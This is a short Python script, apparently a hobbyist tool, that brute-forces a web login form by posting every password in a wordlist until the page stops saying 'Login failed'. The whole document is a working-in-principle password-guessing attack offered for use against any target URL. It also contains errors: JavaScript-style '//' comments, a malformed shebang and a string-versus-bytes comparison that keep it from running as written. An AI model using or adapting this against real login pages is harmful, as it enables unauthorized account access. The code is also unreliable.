#!usr/bin/env python

import requests


target_url = ""//your target url
data_dict = {"username": "123", "password": "", "Login": "submit"}

with open("<file_for_passwords>", "r") as wordlist_file://put the password list inside the " < > " 
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()
print("[+] Reached end of line.")
